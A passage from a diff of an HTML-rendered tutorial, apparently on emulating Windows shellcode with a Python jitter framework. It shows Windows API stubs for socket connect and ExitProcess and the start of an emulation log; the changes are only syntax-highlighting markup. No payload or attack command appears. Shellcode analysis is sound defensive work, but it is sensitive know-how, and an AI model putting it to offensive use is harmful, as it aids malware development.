         port <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;H&#34;</span>, sockaddr[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>]
         ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">.</span>join([str(i) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;BBBB&#34;</span>, sockaddr[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">8</span>])])
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;socket_connect(fd, [{}, {}, {}], {})&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;AF_INET&#34;</span>, port, ip, args<span style="color:#f92672">.</span>namelen))
+        print(<span style="color:#e6db74">&#34;socket_connect(fd, [</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">], </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#e6db74">&#34;AF_INET&#34;</span>, port, ip, args<span style="color:#f92672">.</span>namelen))
     <span style="color:#66d9ef">else</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;connect()&#34;</span>)
+        print(<span style="color:#e6db74">&#34;connect()&#34;</span>)
     jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
 
 
@@ -433,9 +431,9 @@ ValueError: ('unknown api', '0x71ab8b6a', &quot;'ws2_32_WSASocketA'&quot;)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">kernel32_ExitProcess</span>(jitter):
     ret_ad, args <span style="color:#f92672">=</span> jitter<span style="color:#f92672">.</span>func_args_stdcall([<span style="color:#e6db74">&#34;uExitCode&#34;</span>])
     jitter<span style="color:#f92672">.</span>func_ret_stdcall(ret_ad, <span style="color:#ae81ff">0</span>)
-    jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">=</span> False
+    jitter<span style="color:#f92672">.</span>run <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
 </code></pre></div><p>And finally we get a full emulation of the shellcode :</p>
-<pre><code>[INFO    ]: Add module 400000 'sc_windows1.exe'
+<pre tabindex="0"><code>[INFO    ]: Add module 400000 'sc_windows1.exe'
 [INFO    ]: Add module 7c900000 'ntdll.dll'
 [INFO    ]: Add module 7c800000 'kernel32.dll'
 [INFO    ]: Add module 7e410000 'user32.dll'
